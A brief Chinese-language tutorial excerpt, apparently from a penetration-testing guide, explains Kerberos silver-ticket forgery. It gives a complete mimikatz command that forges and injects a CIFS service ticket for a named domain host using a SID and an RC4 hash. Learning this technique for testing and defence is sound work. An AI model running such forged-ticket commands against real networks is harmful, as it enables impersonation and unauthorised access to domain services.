# 5.2.2 白银票据的利用

> 原文：[https://www.zhihuifly.com/t/topic/3435](https://www.zhihuifly.com/t/topic/3435)

### 5.2.2 白银票据的利用

在黄金票据中我们可以不指定 target 和 service，但是在白银票据中必须指定 target 和 service

```
mimikatz.exe privilege::debug "kerberos::golden /domain:adtest.com /sid:S-1-5-21- 3418659180-3421952656-1938706522 /target:WIN-9P499QKTLDO.ADTEST.COM /service:cifs /rc4:22eec3fbe7191bdcf1e5819f8bdcd951 /user:aaa /ptt" 
```

![image](img/aa50b1ed0898ae35ca88d2c452787a9d.png)

![image](img/3b2b93a6bdecab12f41aec1e69c696bb.png)